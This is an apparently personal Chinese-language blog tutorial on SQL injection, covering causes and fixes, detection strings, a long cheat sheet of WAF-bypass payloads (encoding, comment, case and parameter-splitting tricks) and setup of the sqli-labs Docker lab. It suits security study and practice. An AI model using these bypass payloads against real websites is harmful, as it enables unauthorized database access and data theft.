---
title: sql注入
hide: false
tags:
  - 网络安全
abbrlink: 31899
date: 2025-03-04 22:43:25
---



## 1. 概述

**漏洞描述**

​	Web程序代码中对于用户提交的参数未做过滤，被放到SQL语句中执行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执行任意 SQL 语句，如查询数据、下载数据、写入 webshell 、执行系统命令以及绕过登录限制等。

**漏洞存在条件**

- 参数用户可控。
- 参数带入数据库查询。

**测试方法**

​	在发现有可控参数的地方使用 sqlmap 进行 SQL 注入的检查或者利用，也可以使用其他的 SQL 注入工具，简单点的可以手工测试，利用单引号、and1=1 和 and 1=2 以及字符型注入进行判断。

**修复方法**

​	在代码层最佳的防御SQL注入的手段是SQL语句的**预编译和绑定变量**。

​	（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。

​	（2）对进入数据库的特殊字符（ ' <>&*; 等）进行转义处理，或编码转换。

​	（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为 int 型。

​	（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL 注入语句无法正确执行。 

​	（5）网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码不一致有可能导致一些过滤模型被绕过。 

​	（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击 对数据库的危害。 

​	（7）避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。



### 1.1 MySQL相关知识

​	在**mysql5**版本以后，存在一个数据库为`information_schema`，在这个库里面，有三个重要的表：`columns`，`tables`，`SCHEMATA`表，在`SCHEMATA`表中的字段`SCHEMA_NAME`存放着数据库的信息。`tables`表中`TABLE_SCHEMA`和`TABLE_NAME`分别记录库名和表名。`columns`存储该用户创建的所有数据库的库名、表名和字段名。




### 1.2 判断是否存在注入

```sql
id=1 and 1=1
id=1 and 1=2
id=1 or 1=1
id='1'or'1'='1'
id="1"or"1"="1"
```

**有回显**：页面有数据信息返回。

**无回显**：输入不同语句，页面无任何变化。



### 1.3 SQL注释符

`#`：单行注释，常编码为%23。

`--空格`：单行注释，注意后面有个空格。

`/**/`：多行注释，至少存在两处的注入，也常用来作为空格绕过。



### 1.4 SQL注入分类

按注入手法来分：**联合查询、堆叠查询、布尔型、报错型、基于时间延迟**。

按请求类型来分：**GET注入、POST注入、COOKIE注入。**

按注入数据类型来分：**int型、string型、like型**



## 2. SQL注入绕过


### 2.1 空格字符绕过

`%a0`：空格

`%09`：TAB键（水平）

`%0a`：新建一行

`%0c`：新的一页

`%0d`：return功能

`%0b`：TAB键（垂直）

`%00`：空字符

`/**/`：替换空格

`/*!*/`：内联注释



### 2.2 大小写绕过

```sql
union select -> UniOn SelEcT
```



### 2.3 浮点数绕过

```sql
select * from users where id=8E0union select 1,2,3,4;
select * from users where id=8.0union select 1,2,3,4;
```



### 2.4 NULL绕过

`\N`代表NULL



### 2.5 引号绕过

```sql
select * from users where id="1" #双引号绕过
select * from users where username=0x61646D696E; # 字符串转换为16进制
select * from users where id=-1 union select 1,2,(select group_concat(column_name)
from information_schema.columns where TABLE_NAME='users' limit 1),4; # 如果开启gpc，整数型也可以用十六进制绕过
```



### 2.6 添加库名绕过

```sql
select * from users where id=-1 union select 1,2,3,4 from users;
select * from users where id=-1 union select 1,2,3,4 from test.users;
```



### 2.7 去重复绕过

在 mysql 查询可以使用 distinct 去除查询的重复值。可以利用这点突破waf 拦截。

```sql
select * from users where id=-1 union distinct select 1,2,3,4 from users;
select * from users where id=-1 union distinct select 1,2,3,version() fromusers;
```



### 2.8 反引号绕过

字段加反引号可以绕过一些WAF拦截。

```sql
select * from users where id=-1 union select 1,2,3,4 from `test.users`;
```



### 2.9 语言特性绕过

在 php 语言中 id=1&id=2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一些 waf 的拦截。

|               服务器中间件                |          解析结果          |       举例说明       |
| :---------------------------------------: | :------------------------: | :------------------: |
|                ASP.NET/IIS                | 所有出现的参数值用逗号连接 |    color=red,blue    |
|                  ASP/IIS                  |  所有出现的参数用逗号连接  |    color=red,blue    |
|                PHP/Apache                 |    仅最后一次出现参数值    |      color=blue      |
|                 PHP/Zeus                  |    仅最后一次出现参数值    |      color=blue      |
|         JSP,Servlet/Apache Tomcat         |     仅第一次出现参数值     |      color=red       |
| JSP,Servlet/Oracle Application Server 10g |     仅第一次出现参数值     |      color=red       |
|             JSP,Servlet/Jetty             |     仅第一次出现参数值     |      color=red       |
|             IBM Lotus Domino              |    仅最后一次出现参数值    |      color=blue      |
|              IBM HTTP Server              |     仅第一次出现参数值     |      color=red       |
|         mod_perl,libapreq2/Apache         |     仅第一次出现参数值     |      color=red       |
|              Perl CGI/Apache              |     仅第一次出现参数值     |      color=red       |
|          mod_wsgi(Python)/Apache          |     仅第一次出现参数值     |      color=red       |
|                Python/Zope                |         转化为List         | color=['red','blue'] |



### 2.10 逗号绕过

`substr`

```sql
select(substr(database() from 1 for 1);
```

`mid`

```sql
select mid(database() from 1 for 1);
```

`join`

```sql
union select * from 1,2
union select * from (select 1)a join (select 2)b
```

`like`

```sql
select user() like '%r%';
```

`offset`

```sql
limit 1 offset 0
```



### 2.11 or and xor not绕过

`&&`等价于and

`||`等价于or

`!`等价于not

`|`等价于xor



### 2.12 ASCII字符对比绕过

```sql
select * from users where id=1 and ascii(substring(user(),1,1))=114; # char(114)='r'
```



### 2.13 等号绕过

```sql
ascii(substring(user(),1,1))<115; # > <
select substring(user(),1,1)like 'r%'; #like rlike
select user() regexp '^r'; # regexp
```



### 2.14 双写绕过

```sql
uniunionon seleselectct
```



### 2.15 二次编码绕过

`-1 union select 1,2,3,4# `

第一次编码：

`%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23 `

第二次编码：

`%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33`



### 2.16 参数拆分绕过

对于a=[input1]&b=[input2] 可以将参数 a 和 b 拼接在 SQL 语句中，但是过滤了`union select`，可以使用参数拆分

```sql
-1'union/*&username=*/select 1,user(),3,4--+
```



### 2.17 生僻函数绕过

```sql
select polygon((select * from (select * from (select @@version) f) x)); # polygon()替换updatexml()
```



### 2.18 分块传输绕过

​	如果在 http 的消息头里 Transfer-Encoding 为 chunked，那么就是使用chunk编码方式。

​	接下来会发送数量未知的块，每一个块的开头都有一个十六进制的数,表明这个块的大小，然后接 CRLF("\r\n")。然后是数据本身，数据结束后，还会有CRLF("\r\n")两个字符。有一些实现中，块大小的十六进制数和CRLF 之间可以有空格，最后一块大小为0，表示数据发送结束。



### 2.19 信任白名单绕过

WAF会自带一些文件白名单，可以利用白名单绕过

```sql
/phpmyadmin?name=%27%20union%20select%201,user()--+&submit=1

```



### 2.20 pipline绕过

​	http 协议是由 tcp 协议封装而来，当浏览器发起一个 http 请求时，浏览器先和服务器建立起连接 tcp 连接，然后发送 http 数据包（即我们用burpsuite 截获的数据），其中包含了一个 Connection 字段，一般值为 close，Apache 等容器根据这个字段决定是保持该 tcp 连接或是断开。当发送的内容太大，超过一个http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的http 请求所建立的tcp连接不断开，直到所发送内容结束 Connection 为 close 为止。

​	用 burpsuite 抓包提交，复制整个包信息放在第一个包最后，把第一个包close 改成 keep-alive 把 brupsuite 自动更新 Content-Length 勾去掉，有些WAF不会对第一个包的参数进行检测。



### 2.21 利用multipart/form-data绕过

​	multipart/form-data 表示该数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。



### 2.22 order by 绕过

```sql
select * from users where id=1 into @a,@b,@c,@d; # 替代order by猜解字段数
```



### 2.23 修改请求方式绕过

```php
<?php
echo $_REQUEST['id'];
?>
```

可以更改请求方式尝试绕过。



### 2.24 大量字符绕过

```sql
id=1 and (select 1)=(select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)/*!union*//*!select*/1,user()
```



### 2.25 花括号绕过

```sql
select 1,2 union select{x 1},user(); # 花括号左边是注释的内容
```



### 2.26 union select绕过

```sql
sel<>ect # 程序过滤<>为空 脚本处理
sele/**/ct # 程序过滤/**/为空
/*!%53eLEct*/ # url 编码与内联注释
se%0blect # 使用空格绕过
sele%ct # 使用百分号绕过
%53eLEct # 编码绕过
uNIoN sELecT 1,2
union all select 1,2
union DISTINCT select 1,2
null+UNION+SELECT+1,2
/*!union*//*!select*/1,2
union/**/select/**/1,2
and(select 1)=(Select 0xA*1000)/*!uNIOn*//*!SeLECt*/ 1,user()
/*!50000union*//*!50000select*/1,2
/*!40000union*//*!40000select*/1,2
%0aunion%0aselect 1,2
%250aunion%250aselect 1,2
%09union%09select 1,2
%0caunion%0cselect 1,2
%0daunion%0dselect 1,2
%0baunion%0bselect 1,2
%0d%0aunion%0d%0aselect 1,2
--+%0d%0aunion--+%0d%0aselect--+%0d%0a1,--+%0d%0a2
/*!12345union*//*!12345select*/1,2;
/*中文*/union/*中文*/select/*中文*/1,2;
/* */union/* */select/ */1,2;
/*!union*//*!00000all*//*!00000select*/1,2
```





## 3. sqli-labs通关

### 3.1 准备工作

**sqli-labs环境搭建**

```bash
docker pull acgpiano/sqli-labs
docker run -dt --name sqli-labs -p 8888:80 acgpiano/sqli-labs:latest
```

中间可能报错，只需要关闭代理就行。

```bash
Error response from daemon: Head "https://registry-1.docker.io/v2/acgpiano/sqli-labs/manifests/latest": Get "https://auth.docker.io/token?account=squarehhh&scope=repository%3Aacgpiano%2Fsqli-labs%3Apull&service=registry.docker.io": EOF
```

访问网页，环境搭建完毕。

![image-20250305014536324](sql注入/image-20250305014536324.png)

查看相关版本细节。

```bash
$ docker exec -it sqli-labs /bin/bash
$ mysql -e "select version(),user()"
+-------------------------+----------------+
| version()               | user()         |
+-------------------------+----------------+
| 5.5.44-0ubuntu0.14.04.1 | root@localhost |
+-------------------------+----------------+
$ php --version
PHP 5.5.9-1ubuntu4.13 (cli) (built: Sep 29 2015 15:24:49)
Copyright (c) 1997-2014 The PHP Group
Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies
    with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies
$ cd /etc/init.d/ && apache2 -v
Server version: Apache/2.4.7 (Ubuntu)
Server built:   Oct 14 2015 14:20:21
```

